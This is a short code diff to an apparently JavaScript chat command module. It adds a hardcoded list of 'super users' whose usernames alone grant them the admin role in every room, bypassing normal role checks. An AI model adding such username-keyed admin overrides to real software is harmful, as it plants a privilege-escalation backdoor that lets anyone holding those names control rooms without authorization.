@@ -1,6 +1,7 @@
 import * as utils from "./utils.js";
 
 const prefix = ">";
+const superUsers = ["Bob", "Mortis_666"];
 
 class Command {
     constructor() {
@@ -26,6 +27,9 @@ class Command {
 }
 
 function getRole(user, room) {
+    if (superUsers.includes(user.username)) {
+        return "admin";
+    }
     return room.visibility == "public" ? "member" : user.rooms[room._id];
 }
 
